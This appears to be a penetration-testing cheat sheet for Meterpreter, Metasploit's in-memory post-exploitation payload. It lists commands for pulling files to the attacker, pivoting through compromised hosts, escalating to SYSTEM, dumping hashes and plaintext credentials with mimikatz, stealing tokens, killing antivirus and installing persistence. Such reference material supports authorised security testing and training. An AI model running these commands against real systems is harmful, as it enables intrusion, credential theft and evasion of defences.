---
type: tool
category: post-exploitation
tags: [meterpreter, post-exploitation, metasploit, privesc, pivoting]
source: teamghsoftware/security-cheatsheets
---

## What it is
Meterpreter is Metasploit's advanced payload that runs in memory (no disk footprint), provides an encrypted channel back to the attacker, and supports a rich set of post-exploitation commands and extensions.

## Core commands

```bash
help / ?           # show all commands
sysinfo            # OS name, hostname, arch
getuid             # current user
getpid             # process ID meterpreter is in
ps                 # list running processes
background         # push session to background (Ctrl+Z also works)
exit / quit        # terminate session
```

## File system

```bash
ls                 # list files
pwd / getwd        # current directory
cd <path>          # change directory
cat <file>         # read file
download <file>    # pull file to attacker
upload <file>      # push file to target
search -f *.conf   # search for files
```

## Networking

```bash
ipconfig / ifconfig   # network interfaces
netstat               # network connections
portfwd add -l 8080 -p 80 -r <internal-host>   # port forward
route                 # view/edit routing table
```

## Privilege escalation

```bash
getprivs              # list available privileges
use priv              # load priv extension
getsystem             # attempt local privesc to SYSTEM
```

## Pivoting

```bash
# Get subnets the target can reach
run get_local_subnets

# Background session, then add route through it
background
msf > route add 192.168.1.0 255.255.255.0 <session-id>
```

## Credential dumping

```bash
hashdump              # dump SAM hashes (Windows, needs SYSTEM)
load mimikatz
kerberos              # dump Kerberos creds
wdigest               # dump plaintext creds from memory
msv                   # dump NTLM hashes
```

## Token impersonation (incognito)

```bash
load incognito
list_tokens -u
impersonate_token "DOMAIN\\User"
steal_token <pid>
```

## Useful post modules

```bash
run killav                         # kill AV processes
run hashdump                       # dump hashes
run persistence                    # install persistence
run post/multi/recon/local_exploit_suggester   # find local exploits
run post/windows/gather/credentials/credential_collector
```

## Migration

```bash
# Move to a more stable/privileged process
ps                        # find target PID
migrate <pid>             # migrate into it
```

## Related
- [[metasploit]]
- [[msfvenom]]
- [[Pentest Privesc Cheatsheet]]
